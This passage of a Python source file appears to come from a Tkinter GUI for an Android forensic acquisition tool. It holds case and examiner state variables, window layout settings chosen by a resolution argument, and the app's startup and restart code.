        logtime = str(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
        logfile.write(f"{logtime}: {text}\n")

device = None
zytotal =0
paired = False
apps = []
all_apps = []
apps_path=[]
adb = None
state = None
case_number = ""
case_name = ""
evidence_number = ""
examiner = ""
device_info = ""


guiv = "default"
try:
    if sys.argv[1] == "1368":
        guiv = "1368"
    elif sys.argv[1] == "1024":
        guiv = "1024"
    else:
        pass
except:
    pass

if guiv == "default":
    resx = 1100
    resy = 600
    leftx = 340
    rightx = 760
    fsize = 14
    b_button_offset_x = 415
    b_button_offset_y = 410
    sb_button_offset_x = 525
    right_content = 400

elif guiv == "1024":
    resx = 1024
    resy = 600
    leftx = 330
    rightx = 694
    fsize = 14
    b_button_offset_x = 355
    b_button_offset_y = 410
    sb_button_offset_x = 525
    right_content = 360

elif guiv == "1368":
    resx = 1358
    resy = 764
    leftx = 460
    rightx = 800
    fsize = 16
    b_button_offset_x = 545
    b_button_offset_y = 460
    sb_button_offset_x = 655
    right_content = 500

if __name__ == "__main__":
    app = MyApp()
    app.mainloop()

#Restart the app
def restart():
    app.destroy()
    app = MyApp()
    app.mainloop()